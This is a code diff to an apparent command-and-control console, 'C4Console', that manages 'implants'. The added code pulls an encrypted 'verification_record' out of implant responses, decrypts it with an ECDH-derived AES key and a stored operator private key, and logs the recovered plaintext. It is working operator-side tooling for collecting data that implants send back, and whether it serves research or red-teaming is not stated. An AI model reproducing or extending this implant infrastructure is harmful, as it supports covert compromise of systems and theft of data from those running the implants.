@@ -41,6 +41,14 @@ from encode import (  # noqa: E402
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 from browser_bridge import BrowserBridge, BrowserBridgeClient  # noqa: E402
 
+import base64
+import hashlib
+import re
+
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import serialization
+
 from aiohttp import web
 from rich.text import Text
 from textual import on, work
@@ -164,6 +172,49 @@ _TOOL_PARAMS: dict[str, list[str]] = {
 _C4_DIR = Path(__file__).resolve().parent.parent
 _OUT_DIR = _C4_DIR / "implants"
 _VALUE_CODEBOOK = _C4_DIR / "value_codebook.yaml"
+
+
+def decrypt_verification_record(blob_b64: str, private_key_path: Path) -> str | None:
+    """Decrypt a verification_record blob using the operator's private key.
+
+    The blob format is: [Ephemeral SPKI pubkey (91 bytes)][IV (16 bytes)][AES ciphertext]
+    """
+    try:
+        combined = base64.b64decode(blob_b64)
+
+        # Parse components
+        eph_pubkey_len = 91
+        iv_len = 16
+        eph_pubkey_bytes = combined[:eph_pubkey_len]
+        iv = combined[eph_pubkey_len : eph_pubkey_len + iv_len]
+        ciphertext = combined[eph_pubkey_len + iv_len :]
+
+        # Load operator private key
+        priv_key_bytes = private_key_path.read_bytes()
+        private_key = serialization.load_der_private_key(priv_key_bytes, password=None)
+
+        # Load ephemeral public key
+        eph_public_key = serialization.load_der_public_key(eph_pubkey_bytes)
+
+        # ECDH to derive shared secret
+        shared_secret = private_key.exchange(ec.ECDH(), eph_public_key)
+
+        # SHA-256 hash of shared secret = AES key
+        aes_key = hashlib.sha256(shared_secret).digest()
+
+        # Decrypt with AES-256-CBC
+        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(ciphertext) + decryptor.finalize()
+
+        # Remove PKCS7 padding
+        pad_len = padded[-1]
+        plaintext = padded[:-pad_len]
+
+        return plaintext.decode("utf-8")
+    except Exception as e:
+        log.warning("Failed to decrypt verification_record: %s", e)
+        return None
 
 
 class ImplantEncoder:
@@ -1045,10 +1096,77 @@ class C4Console(App):
                 self._log(f"  [dim]... ({len(response)} chars total, truncated)[/]")
             else:
                 self._log(response)
+
+            # Try to extract and decrypt verification_record from JSON response
+            self._try_decrypt_response(implant_id, response)
+
             self._log("")
         except Exception as e:
             slog(f"ERROR | implant={implant_id} browser_send_failed: {e}")
             self._log(f"  [red]Browser send failed:[/] {e}")
+
+    def _try_decrypt_response(self, implant_id: str, response: str) -> None:
+        """Attempt to extract and decrypt verification_record from response JSON."""
+        # Look for verification_record anywhere in response
+        if "verification_record" not in response:
+            return
+
+        # Find all potential JSON objects in the response and try to parse each
+        verification_record = None
+        for match in re.finditer(r'\{', response):
+            start = match.start()
+            # Find matching closing brace
+            depth = 0
+            end = start
+            for i, c in enumerate(response[start:], start):
+                if c == '{':
+                    depth += 1
+                elif c == '}':
+                    depth -= 1
+                    if depth == 0:
+                        end = i + 1
+                        break
+            if depth != 0:
+                continue
+
+            try:
+                json_str = response[start:end]
+                data = json.loads(json_str)
+                if isinstance(data, dict) and "verification_record" in data:
+                    verification_record = data["verification_record"]
+                    break
+            except (json.JSONDecodeError, ValueError):
+                continue
+
+        if not verification_record:
+            return
+
+        # Find the private key for this implant
+        private_key_path = _OUT_DIR / implant_id / "operator_private.der"
+        if not private_key_path.exists():
+            self._log(f"\n[yellow]⚠ Cannot decrypt: private key not found[/]")
+            self._log(f"  [dim]expected: {private_key_path}[/]")
+            return
+
+        # Decrypt the verification record
+        plaintext = decrypt_verification_record(verification_record, private_key_path)
+        if plaintext:
+            self._log("\n[bold green]🔓 Decrypted verification_record:[/]")
+            # Try to pretty-print if it's JSON
+            try:
+                decrypted_data = json.loads(plaintext)
+                formatted = json.dumps(decrypted_data, indent=2)
+                # Truncate if too long
+                if len(formatted) > 3000:
+                    self._log(formatted[:3000])
+                    self._log(f"  [dim]... ({len(formatted)} chars total)[/]")
+                else:
+                    self._log(formatted)
+            except json.JSONDecodeError:
+                self._log(plaintext[:2000] if len(plaintext) > 2000 else plaintext)
+            slog(f"DECRYPTED | implant={implant_id}\n{plaintext}")
+        else:
+            self._log("\n[red]⚠ Failed to decrypt verification_record[/]")
 
     # -- Alias -----------------------------------------------------------
 
